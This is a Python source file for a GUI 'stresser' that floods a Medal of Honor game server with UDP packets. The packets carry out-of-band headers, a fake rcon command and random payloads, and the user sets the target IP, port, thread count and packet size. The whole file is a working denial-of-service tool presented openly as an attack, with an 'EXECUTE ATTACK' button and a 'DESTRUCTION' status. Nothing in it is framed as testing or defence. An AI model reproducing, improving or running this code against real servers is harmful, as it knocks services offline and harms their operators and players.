import socket
import threading
import random
import time
import tkinter as tk
from tkinter import ttk, messagebox
class ProDestroyer:
    def __init__(self, root):
        self.root = root
        self.root.title("MOHAA STRESSER")
        self.root.geometry("500x450")
        self.root.resizable(False, False)
        self.is_attacking = False
        self.sent = 0
        self.received = 0
        self.errors = 0
        tk.Label(root, text="MEDAL OF HONOR", font=("Consolas", 16, "bold"), fg="#00FF00", bg="black").pack(fill='x')
        root.configure(bg="#1e1e1e")
        self.footer_label = tk.Label(root, text="Developed by: BayLak",
                                     fg="#555", bg="#1e1e1e", font=("Arial", 10, "italic"))
        self.footer_label.pack(side='bottom', pady=5)
        frame = tk.Frame(root, bg="#1e1e1e")
        frame.pack(pady=20, padx=20, fill='x')
        self.add_label(frame, "Target IP:", 0)
        self.ip_entry = self.add_entry(frame, "127.0.0.1", 0)
        self.add_label(frame, "Port:", 1)
        self.port_entry = self.add_entry(frame, "12203", 1)
        self.add_label(frame, "Threads (Power):", 2)
        self.threads_entry = self.add_entry(frame, "10", 2)
        self.add_label(frame, "Packet Size (Bytes):", 3)
        self.size_entry = self.add_entry(frame, "1024", 3)
        self.add_label(frame, "Delay (ms) - 0 for Max:", 4)
        self.delay_entry = self.add_entry(frame, "0", 4)
        self.stats_text = tk.Text(root, height=8, bg="black", fg="#00FF00", font=("Consolas", 10))
        self.stats_text.pack(pady=10, padx=20)
        self.start_btn = tk.Button(root, text="EXECUTE ATTACK", bg="#440000", fg="white", font=("Arial", 12, "bold"), command=self.toggle)
        self.start_btn.pack(pady=10, fill='x', padx=50)
    def add_label(self, parent, text, row):
        tk.Label(parent, text=text, fg="white", bg="#1e1e1e").grid(row=row, column=0, sticky='w', pady=5)
    def add_entry(self, parent, default, row):
        e = tk.Entry(parent, bg="#333", fg="white", insertbackground="white")
        e.insert(0, default)
        e.grid(row=row, column=1, sticky='ew', pady=5, padx=10)
        return e
    def attack_logic(self, ip, port, size, delay):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setblocking(False)
        headers = [b"\xff\xff\xff\xff\x02", b"\xff\xff\xff\xff"]
        while self.is_attacking:
            try:
                head = random.choice(headers)
                body = random.randbytes(size)
                packet = head + b"rcon \"\" " + body
                sock.sendto(packet, (ip, port))
                self.sent += 1
                try:
                    data, addr = sock.recvfrom(1024)
                    if data: self.received += 1
                except: pass
                if delay > 0:
                    time.sleep(delay / 1000)
            except:
                self.errors += 1
    def update_display(self):
        while self.is_attacking:
            self.stats_text.delete(1.0, tk.END)
            stats = (f">> [ATTACKING] Target: {self.ip_entry.get()}\n"
                     f">> Packets Sent    : {self.sent:,}\n"
                     f">> Server Responses: {self.received:,}\n"
                     f">> Socket Errors   : {self.errors:,}\n"
                     f">> Current Status  : {'DESTRUCTION' if self.received < (self.sent*0.01) else 'LAGGING'}")
            self.stats_text.insert(tk.END, stats)
            time.sleep(0.5)
    def toggle(self):
        if not self.is_attacking:
            self.is_attacking = True
            self.sent = self.received = self.errors = 0
            self.start_btn.config(text="STOP SYSTEM", bg="red")
            t_count = int(self.threads_entry.get())
            p_size = int(self.size_entry.get())
            p_delay = float(self.delay_entry.get())
            for _ in range(t_count):
                threading.Thread(target=self.attack_logic, args=(self.ip_entry.get(), int(self.port_entry.get()), p_size, p_delay), daemon=True).start()
            threading.Thread(target=self.update_display, daemon=True).start()
        else:
            self.is_attacking = False
            self.start_btn.config(text="EXECUTE ATTACK", bg="#440000")
if __name__ == "__main__":
    root = tk.Tk()
    app = ProDestroyer(root)
    root.mainloop()